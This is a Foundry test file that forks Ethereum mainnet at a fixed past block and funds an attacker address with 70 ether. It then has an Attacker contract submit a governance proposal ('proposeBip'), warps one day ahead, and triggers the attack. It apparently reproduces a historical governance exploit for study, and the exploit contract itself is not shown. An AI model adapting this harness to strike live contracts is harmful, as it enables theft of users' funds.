// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Attacker.sol";
import "forge-std/console.sol";

contract TestAttacker is Test {
    Attacker attacker;
    address mastermind;

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth", 14595905);
        mastermind = mkaddr("mastermind");
        vm.prank(mastermind);
        attacker = new Attacker();
    }

    function testAttack() public {
        vm.startPrank(mastermind);
        vm.deal(mastermind, 70 ether);
        attacker.proposeBip{value: 70 ether}();

        console.log("Proposal created, warping, %", block.timestamp);
        vm.warp(block.timestamp + 1 days); // travelling 1 day in the future
        console.log("Warped, %s", block.timestamp);

        attacker.attack();
        vm.stopPrank();
    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
